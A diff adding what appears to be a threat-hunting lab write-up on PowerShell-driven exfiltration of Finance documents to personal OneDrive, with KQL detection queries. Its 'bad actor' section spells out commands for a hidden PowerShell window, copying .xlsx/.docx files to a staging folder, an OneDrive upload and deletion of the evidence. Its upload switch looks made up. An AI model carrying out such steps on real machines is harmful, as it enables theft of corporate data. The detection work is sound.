@@ -1,0 +1,89 @@
+Threat Event (PowerShell Abuse & OneDrive Exfiltration)
+Suspicious PowerShell Usage to Upload Files to Personal OneDrive
+
+Reason for the Hunt:
+A recent cybersecurity advisory warned of attackers using PowerShell and cloud storage (like OneDrive) to bypass perimeter controls and exfiltrate sensitive data. Additionally, internal logs showed repeated PowerShell activity on a finance workstation outside business hours. Management requested a hunt to determine if corporate data was being exfiltrated.
+
+Steps the "Bad Actor" Took to Create Logs and IoCs:
+Opened PowerShell using a hidden window:
+
+powershell
+Copy
+Edit
+powershell.exe -WindowStyle Hidden
+Collected internal documents from known sensitive directories:
+
+powershell
+Copy
+Edit
+Get-ChildItem "C:\Users\employee\Documents\Finance" -Recurse -Include *.xlsx,*.docx | Copy-Item -Destination "C:\Temp\exfil"
+Used PowerShell to download the OneDrive CLI or used Invoke-WebRequest to simulate browser login:
+
+powershell
+Copy
+Edit
+Invoke-WebRequest -Uri "https://onedrive.live.com/about/en-us/" -UseBasicParsing
+Uploaded files to OneDrive (simulated via web request or legitimate sync tool):
+
+powershell
+Copy
+Edit
+Start-Process "C:\Program Files\OneDrive\OneDrive.exe" /upload "C:\Temp\exfil"
+Deleted local exfil folder:
+
+powershell
+Copy
+Edit
+Remove-Item -Path "C:\Temp\exfil" -Recurse -Force
+Tables Used to Detect IoCs:
+Table	Purpose
+DeviceProcessEvents	Detect use of PowerShell, suspicious flags, and OneDrive-related processes
+DeviceFileEvents	Detect file access and copying in sensitive folders
+DeviceNetworkEvents	Identify connections to OneDrive domains/IPs from PowerShell
+
+Related Queries:
+kql
+Copy
+Edit
+// Detect hidden PowerShell windows
+DeviceProcessEvents
+| where FileName == "powershell.exe"
+| where ProcessCommandLine contains "-WindowStyle Hidden"
+
+// Detect file copying from sensitive directory
+DeviceFileEvents
+| where FolderPath has "Finance"
+| where FileName endswith ".xlsx" or FileName endswith ".docx"
+| where InitiatingProcessFileName == "powershell.exe"
+
+// Detect outbound OneDrive connections from PowerShell
+DeviceNetworkEvents
+| where InitiatingProcessFileName == "powershell.exe"
+| where RemoteUrl has_any ("onedrive.live.com", "storage.live.com")
+
+// Detect OneDrive application uploads
+DeviceProcessEvents
+| where FileName == "OneDrive.exe"
+| where ProcessCommandLine contains "/upload"
+Created By:
+Author Name: [Your Name]
+
+Author Contact: [Your LinkedIn or GitHub URL]
+
+Date: [Today's Date]
+
+Validated By:
+Reviewer Name:
+
+Reviewer Contact:
+
+Validation Date:
+
+Additional Notes:
+Uploads to personal OneDrive accounts are harder to track unless restricted via Microsoft Entra or conditional access policies.
+
+Consider monitoring clipboard usage and browser-based uploads in future iterations.
+
+Revision History:
+Version	Changes	Date	Modified By
+1.0	Initial Draft	April 30, 2025	[Your Name]
